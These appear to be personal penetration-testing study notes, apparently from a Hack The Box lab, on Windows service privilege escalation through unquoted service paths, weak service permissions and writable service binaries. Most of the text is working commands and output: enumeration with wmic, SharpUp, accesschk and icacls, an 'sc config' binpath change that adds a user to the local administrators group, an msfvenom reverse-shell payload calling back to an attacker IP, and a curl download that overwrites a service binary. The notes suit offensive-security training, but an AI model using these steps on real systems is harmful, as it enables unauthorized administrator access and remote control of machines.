
# Binary Path

This is the path where the actual executable (.exe) for the service is located. Windows services are often in `C:\Windows\system32` and third party in `C:\Program Files` / `C:\Program Files (x86)`


# Unquoted Service 


```powershell
// ------------------------ Unquoted service path ------------------------ //

// Enumerating
run wmic service get name, pathname (from CRTO)
SharpUp.exe audit UnquotedServicePath
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```


# Weak Service Permissions (BinPath Essentially)


```Powershell
// ------------------------ Weak Service Permissions ------------------------ //
// NOTE: CANT ICACLS THIS BEACUSE ICACLS IS USED FOR FILES AND FOLDERS


C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS  <-------------------------------------- We can fuck around and find out



// So now that we know we can change the service binary lets change it ourselves
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"



// ------------------------ Lets stop and then run the service ------------------------ //
sc stop windscribeservice && sc stop windscribeservice


// ------------------------ Now lets check our group ------------------------ //

net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
htb-student  <---------------------- US!!!!
mrb3n
```



# Weak Service Binary Permissions


```powershell
// -------------------------- Binary Permissions Abuse -------------------------- //

.\SharpUp.exe audit

=== Modifiable Service Binaries ===   <----------------------------------

  Name             : SecurityService
<..SNIP..>		   : <..SNIP..>
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"      <----------------------------------



// Now lets check the permissions

C:\Tools>icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)      <--------------------- Full Permissions on the binary
                                                     NT AUTHORITY\SYSTEM:(I)(F)
													<..SNIP..>



// now lets create our MSFVENOM Payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.176 LPORT=8443 -f exe -o file.exe



// Now lets transfer it over 

curl http://10.10.15.176:7000/SecurityService.exe -o SecurityService.exe # the location of the fucking svc btw dont be retarded

// now we launch the service!

sc start SecurityService
```

